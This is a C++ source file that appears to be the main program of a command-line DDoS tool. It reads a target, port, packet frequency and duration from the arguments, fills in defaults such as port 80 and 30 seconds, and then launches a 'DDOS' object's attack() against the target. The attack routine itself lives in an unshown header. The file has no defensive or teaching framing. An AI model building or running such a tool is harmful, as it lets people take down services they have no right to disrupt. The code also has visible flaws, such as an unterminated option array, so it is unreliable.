#include "../include/commands.hh"

int main(int argc, char **argv) {

  int c;
  struct option options[] = {
      {"port",         required_argument, 0, 'p'},
      {"frequency",    required_argument, 0, 'f'},
      {"target",       required_argument, 0, 't'},
      {"time",         required_argument, 0, 's'},
      {"help",         no_argument,       0, 'h'},
      {"version",      no_argument,       0, 'v'}
  };
  map<string, string> commands;

  while(true) {
    c = getopt_long(argc, argv, "p:t:f:t:s:hv", options, NULL);

    if (c == -1)
      break;

    switch (c) {
      case 'p':
        commands["port"] = optarg;
        break;

      case 'f':
        commands["freqency"] = optarg;
        break;

      case 't':
        commands["target"] = optarg;
        break;

      case 's':
        commands["time"] = optarg;
        break;

      case 'h':
        HELP
        exit(0);
        break;

      case 'v':
        VERSION
        exit(0);
        break;

      case '?':
        DEFAULT
        exit(0);
        break;
      }
    }

    MIN_SUPER_INT port = atoi(commands["port"].c_str());
    MAX_SUPER_INT frequency = atoi(commands["freqency"].c_str());
    MAX_SUPER_INT timeDDOS = atoi(commands["time"].c_str());

    subChecking(&port, &frequency, &timeDDOS);

    DDOS go(commands["target"], frequency, port, timeDDOS);
    go.attack();
    sleep(timeDDOS + 2); //# 2 seconds for the margin.
  return 0;
}

template<typename P, typename F, typename T>
static void subChecking(P *port, F *frequency, T *timeDDOS) {
  if(*(port) == 0) {
    *(port) = (P) 80;
    CHANGE_PORT
  }

  if(*(frequency) == 0) {
    *(frequency) = (F) 10;
    CHANGE_FREQUENCY
  }

  if(*(timeDDOS) == 0) {
    *(timeDDOS) = (T) 30;
    CHANGE_TIME
  }
}
